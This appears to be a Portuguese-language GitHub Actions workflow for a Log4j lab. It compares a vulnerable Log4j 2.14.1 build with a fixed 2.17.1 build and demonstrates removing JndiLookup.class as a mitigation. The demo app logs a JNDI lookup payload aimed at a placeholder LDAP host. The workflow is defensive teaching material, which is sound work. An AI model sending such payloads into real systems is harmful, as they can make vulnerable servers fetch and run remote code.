name: "üîç Lab Log4j ‚Äî vetor JNDI & mitiga√ß√£o (sa√≠da em tela)"

on:
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  lab:
    name: "${{ matrix.scenario }} ‚Äî build & inspect"
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        include:
          - scenario: vulneravel
            maven_profile: vulneravel
            log4j_version: "2.14.1"
          - scenario: corrigido
            maven_profile: corrigido
            log4j_version: "2.17.1"

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java 17 & Maven
        run: |
          sudo apt-get update -y
          sudo apt-get install -y maven jq unzip zip
          java -version || true
          mvn -v || true

      - name: Criar projeto Java (pom.xml & App.java)
        run: |
          mkdir -p src/main/java/com/example
          cat > pom.xml <<'XML'
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
            <modelVersion>4.0.0</modelVersion>
            <groupId>com.example</groupId>
            <artifactId>log4j-lab</artifactId>
            <version>1.0.0</version>
            <properties>
              <maven.compiler.source>11</maven.compiler.source>
              <maven.compiler.target>11</maven.compiler.target>
              <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
            </properties>

            <dependencies>
              <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-api</artifactId>
                <version>${log4j.version}</version>
              </dependency>
              <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-core</artifactId>
                <version>${log4j.version}</version>
              </dependency>
            </dependencies>

            <build>
              <plugins>
                <plugin>
                  <groupId>org.codehaus.mojo</groupId>
                  <artifactId>exec-maven-plugin</artifactId>
                  <version>3.1.0</version>
                  <configuration>
                    <mainClass>com.example.App</mainClass>
                  </configuration>
                </plugin>
              </plugins>
            </build>

            <profiles>
              <profile>
                <id>vulneravel</id>
                <properties>
                  <log4j.version>2.14.1</log4j.version>
                </properties>
              </profile>
              <profile>
                <id>corrigido</id>
                <properties>
                  <log4j.version>2.17.1</log4j.version>
                </properties>
              </profile>
            </profiles>
          </project>
          XML

          cat > src/main/java/com/example/App.java <<'JAVA'
          package com.example;
          import org.apache.logging.log4j.LogManager;
          import org.apache.logging.log4j.Logger;

          public class App {
              private static final Logger logger = LogManager.getLogger(App.class);
              public static void main(String[] args) {
                  logger.info("Iniciando app de demonstra√ß√£o Log4j");
                  // Mensagem com placeholder inofensivo (N√ÉO executa nada)
                  String entrada = "${jndi:ldap://example.com/a}";
                  logger.warn("Entrada recebida: {}", entrada);
                  System.out.println("DONE");
              }
          }
          JAVA

      - name: Build (profile ${{ matrix.maven_profile }})
        run: |
          mvn -B -q -P${{ matrix.maven_profile }} -DskipTests package

      - name: Mostrar vers√£o Log4j resolvida
        id: deps
        run: |
          mvn -q -P${{ matrix.maven_profile }} -DincludeScope=runtime -DexcludeTransitive=false \
            org.apache.maven.plugins:maven-dependency-plugin:3.6.1:tree | tee maven-deps-${{ matrix.scenario }}.txt
          VERSION=$(grep -Eo 'org.apache.logging.log4j:log4j-core:[0-9.]+(-[A-Za-z0-9.]+)?' maven-deps-${{ matrix.scenario }}.txt | head -n1 | cut -d: -f3)
          echo "version=$VERSION" >> $GITHUB_OUTPUT
          echo "==> Log4j/Core detectado: $VERSION"

      - name: Inspecionar JndiLookup no JAR (presen√ßa do vetor)
        run: |
          JAR=$(mvn -q -P${{ matrix.maven_profile }} -DincludeScope=runtime \
                 org.apache.maven.plugins:maven-dependency-plugin:3.6.1:copy \
                 -Dartifact=org.apache.logging.log4j:log4j-core:${{ matrix.log4j_version }}:jar \
                 -DoutputDirectory=./target | grep -Eo 'target/log4j-core-.*\.jar' | tail -n1 || true)
          echo "JAR copiado: $JAR"
          unzip -l "$JAR" | grep -E "JndiLookup\\.class" && echo ">> JndiLookup PRESENTE (vetor existente)" || echo ">> JndiLookup AUSENTE (vetor mitigado)"

      - name: Executar app "como est√°" (stdout)
        run: |
          echo "===== RUN (sem mitiga√ß√£o manual) ‚Äî ${{ matrix.scenario }} ====="
          mvn -q -P${{ matrix.maven_profile }} exec:java | tee run-${{ matrix.scenario }}.log || true

      - name: Mitiga√ß√£o manual (remover JndiLookup.class) e reexecutar
        run: |
          echo "===== Mitigando por remo√ß√£o do JndiLookup.class ====="
          ORIG_JAR="target/log4j-core-${{ matrix.log4j_version }}.jar"
          cp "$ORIG_JAR" "target/log4j-core-${{ matrix.log4j_version }}-nojndi.jar"
          zip -q -d "target/log4j-core-${{ matrix.log4j_version }}-nojndi.jar" 'org/apache/logging/log4j/core/lookup/JndiLookup.class' || true
          echo "Reexecutando app com JAR mitigado no classpath..."
          CP="$(mvn -q -P${{ matrix.maven_profile }} -Dexec.classpathScope=runtime \
                 org.codehaus.mojo:exec-maven-plugin:3.1.0:exec -Dexec.executable=echo -Dexec.args='%classpath' | tail -n1)"
          # Substitui o JAR original pelo mitigado no CP
          CP2="${CP//$ORIG_JAR/target/log4j-core-${{ matrix.log4j_version }}-nojndi.jar}"
          echo "Classpath ajustado."
          java -cp "$CP2" com.example.App | tee run-${{ matrix.scenario }}-nojndi.log || true

      - name: ‚úÖ Painel final (em tela)
        if: always()
        run: |
          echo ""
          echo "=== RESUMO ‚Äî Cen√°rio: ${{ matrix.scenario }} ==="
          echo "Log4j/Core: ${{ steps.deps.outputs.version }}"
          echo "- Antes da mitiga√ß√£o (JndiLookup presente?):"
          (unzip -l "target/log4j-core-${{ matrix.log4j_version }}.jar" | grep -q 'JndiLookup.class' && echo "  -> PRESENTE") || echo "  -> AUSENTE"
          echo "- Depois da mitiga√ß√£o (JndiLookup removido?):"
          (unzip -l "target/log4j-core-${{ matrix.log4j_version }}-nojndi.jar" | grep -q 'JndiLookup.class' && echo "  -> AINDA PRESENTE (falhou)" ) || echo "  -> REMOVIDO"
          echo ""
          echo "Sa√≠das (trechos):"
          echo "--- run-${{ matrix.scenario }}.log (sem mitiga√ß√£o) ---"; head -n 5 run-${{ matrix.scenario }}.log || true
          echo "--- run-${{ matrix.scenario }}-nojndi.log (com mitiga√ß√£o) ---"; head -n 5 run-${{ matrix.scenario }}-nojndi.log || true

      - name: Artefatos opcionais
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: "outputs-${{ matrix.scenario }}"
          path: |
            maven-deps-${{ matrix.scenario }}.txt
            run-${{ matrix.scenario }}.log
            run-${{ matrix.scenario }}-nojndi.log
            target/log4j-core-${{ matrix.log4j_version }}.jar
            target/log4j-core-${{ matrix.log4j_version }}-nojndi.jar
